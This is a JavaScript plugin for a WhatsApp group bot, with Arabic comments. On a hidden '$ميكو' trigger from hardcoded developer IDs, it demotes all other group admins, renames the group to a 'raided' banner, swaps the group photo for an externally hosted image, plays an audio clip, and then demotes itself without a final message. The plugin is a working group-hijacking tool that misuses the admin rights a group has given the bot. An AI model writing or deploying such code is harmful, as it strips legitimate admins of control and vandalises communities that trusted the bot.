// plugins/ميكو.js
// ✧ 𝐀𝐑𝐓𝐇𝐔𝐑 𝐁𝐎𝐓 - MIKU 🪄

const DEVELOPERS = [
    '185899757400132',
    '233144431206490',
    '135974805860531',
    '116853997338673'
]

const GROUP_NAME = '『𝐌𝐈𝐊𝐔﹝🪄﹞مزروف'
const GROUP_IMAGE = 'https://d.uguu.se/GzFrfVzl.jpg'
const MIKU_AUDIO = 'https://n.uguu.se/NgvQqAiX.m4a'

const clean = (v = '') =>
    String(v)
        .split('@')[0]
        .split(':')[0]
        .replace(/\D/g, '')

const isDev = (m, isOwner, isROwner) => {

    if (isOwner || isROwner) return true

    const sender = clean(
        m.sender ||
        m.key?.participant ||
        ''
    )

    return DEVELOPERS.some(
        n => clean(n) === sender
    )
}

const handler = async (
    m,
    {
        conn,
        isOwner,
        isROwner
    }
) => {

    if (!m.isGroup) return

    if (String(m.text || '').trim() !== '$ميكو')
        return

    if (!isDev(m, isOwner, isROwner)) {
        return m.reply(
`*╭━━━〔 𝐀𝐑𝐓𝐇𝐔𝐑 𝐁𝐎𝐓 🔒 〕━━━╮*
*┃*
*┃* ❌ الأمر ده للمطور فقط.
*┃*
*╰━━━━━━━━━━━━━━╯*`
        )
    }

    try {

        // 🎵 الأغنية أولًا
        try {
            await conn.sendMessage(
                m.chat,
                {
                    audio: {
                        url: MIKU_AUDIO
                    },
                    mimetype: 'audio/mp4',
                    ptt: false
                },
                { quoted: m }
            )
        } catch {}

        const metadata =
            await conn.groupMetadata(m.chat)

        // رقم البوت الحقيقي
        const botNumber =
            clean(conn.user?.id)

        // المطورين
        const devNumbers =
            DEVELOPERS.map(clean)

        // =========================================
        // 🛡️ سحب الإشراف من باقي المشرفين
        // =========================================

        const admins =
            metadata.participants
                .filter(p => p.admin)
                .filter(p => {

                    const number = clean(p.id)

                    // ❌ لا تسحب من المطورين
                    if (
                        devNumbers.includes(number)
                    ) return false

                    // ❌ لا تسحب من البوت الآن
                    if (
                        number === botNumber
                    ) return false

                    return true
                })
                .map(p => p.id)

        if (admins.length) {

            try {

                await conn.groupParticipantsUpdate(
                    m.chat,
                    admins,
                    'demote'
                )

            } catch (e) {
                console.log(
                    '[MIKU DEMOTE]',
                    e.message
                )
            }
        }

        // =========================================
        // 🏷️ تغيير اسم المجموعة
        // =========================================

        try {

            await conn.groupUpdateSubject(
                m.chat,
                GROUP_NAME
            )

        } catch (e) {
            console.log(
                '[MIKU NAME]',
                e.message
            )
        }

        // =========================================
        // 🖼️ تغيير صورة المجموعة
        // =========================================

        try {

            await conn.updateProfilePicture(
                m.chat,
                {
                    url: GROUP_IMAGE
                }
            )

        } catch (e) {
            console.log(
                '[MIKU IMAGE]',
                e.message
            )
        }

        // =========================================
        // 🔻 آخر خطوة فقط:
        // البوت يسحب الإشراف من نفسه
        // =========================================

        try {

            const botJid =
                conn.user?.id

            if (botJid) {

                await conn.groupParticipantsUpdate(
                    m.chat,
                    [botJid],
                    'demote'
                )
            }

        } catch (e) {

            console.log(
                '[MIKU BOT DEMOTE]',
                e.message
            )
        }

        // لا ترسل رسالة نهائية

    } catch (e) {

        console.error(
            '[MIKU ERROR]',
            e
        )

        return
    }
}

handler.command = /^(ميكو)$/i
handler.group = true

// =========================================
// $ميكو مباشرة بدون نقطة
// =========================================

handler.before = async (
    m,
    {
        conn,
        isOwner,
        isROwner
    }
) => {

    if (
        String(m.text || '').trim() !== '$ميكو'
    ) return

    return handler(
        m,
        {
            conn,
            isOwner,
            isROwner
        }
    )
}

export default handler